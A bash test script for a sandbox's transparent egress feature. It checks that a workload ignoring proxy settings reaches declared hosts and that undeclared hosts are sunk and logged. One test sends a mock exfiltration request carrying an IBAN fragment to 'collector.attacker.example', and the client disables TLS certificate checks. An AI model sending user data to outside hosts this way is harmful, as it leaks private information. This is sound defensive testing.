#!/usr/bin/env bash
# ============================================================================
# t_transparent_egress.sh — a workload that ignores the proxy (ADR-0027)
#
# Tests:
#   1. Without transparent egress, a client with no proxy settings fails
#      to connect, and no event says it tried (the gap)
#   2. With it, the same client reaches a declared host over HTTPS (by SNI)
#   3. ... and over plain HTTP (by Host)
#   4. An undeclared host it reaches directly is sunk, and the request it
#      carried is recorded
# ============================================================================

source "$(dirname "$0")/lib.sh"
require_user_namespaces
require_pasta
require_python3
header "Transparent egress"

WORK=$(mktemp -d)
trap 'kill "$SERVER_PID" 2>/dev/null; rm -rf "$WORK"; cleanup' EXIT

PORT=$(python3 -c 'import socket; s=socket.socket(); s.bind(("127.0.0.1", 0)); print(s.getsockname()[1])')
python3 - "$PORT" >/dev/null 2>&1 <<'PY' &
import http.server, sys

class Answer(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"from-the-host\n")

http.server.HTTPServer(("127.0.0.1", int(sys.argv[1])), Answer).serve_forever()
PY
SERVER_PID=$!
sleep 0.5

recipe() {
    tmpconfig <<TOML
[network]
egress = "proxy"
undeclared_hosts = "sink"
$1

[unsafe]
host_loopback = true

[[host]]
domain = "mock.example"
upstream = "loopback:$PORT"
TOML
}
PLAIN=$(recipe "")
TRANSPARENT=$(recipe "transparent = true")
_TMPFILES+=("$PLAIN" "$TRANSPARENT")

# No proxy variables at all, as a stdio MCP server started by the MCP SDK.
NO_PROXY_ENV=(env -u HTTP_PROXY -u HTTPS_PROXY -u http_proxy -u https_proxy)
FETCH='import ssl, sys, urllib.request
context = ssl._create_unverified_context()
try:
    print(urllib.request.urlopen(sys.argv[1], timeout=10, context=context).read().decode().strip())
except Exception as e:
    print("failed:", type(e).__name__)'

begin_test "without transparent egress, a client ignoring the proxy fails unseen"
run_can run --recipe "$PLAIN" --events-file "$WORK/plain.jsonl" \
    -- "${NO_PROXY_ENV[@]}" python3 -c "$FETCH" https://mock.example/x
assert_contains "$RUN_STDOUT" "failed:"
assert_not_contains "$(cat "$WORK/plain.jsonl" 2>/dev/null)" '"host":"mock.example"'

begin_test "with it, the client reaches a declared host over HTTPS"
run_can run --recipe "$TRANSPARENT" \
    -- "${NO_PROXY_ENV[@]}" python3 -c "$FETCH" https://mock.example/x
assert_eq "from-the-host" "$RUN_STDOUT"

begin_test "and over plain HTTP"
run_can run --recipe "$TRANSPARENT" \
    -- "${NO_PROXY_ENV[@]}" python3 -c "$FETCH" http://mock.example/x
assert_eq "from-the-host" "$RUN_STDOUT"

begin_test "an undeclared host reached directly is sunk, with its request recorded"
run_can run --recipe "$TRANSPARENT" --events-file "$WORK/sunk.jsonl" \
    -- "${NO_PROXY_ENV[@]}" python3 -c "$FETCH" "https://collector.attacker.example/in?iban=CH93"
SUNK=$(python3 - "$WORK/sunk.jsonl" <<'PY'
import json, sys
for line in open(sys.argv[1], encoding="utf-8"):
    e = json.loads(line)
    d = e["data"]
    if e["event"] == "egress_request" and d.get("reason") == "sink" and d.get("method") != "CONNECT":
        print(d["host"] + d["path"])
PY
)
assert_contains "$SUNK" "collector.attacker.example/in"

summary
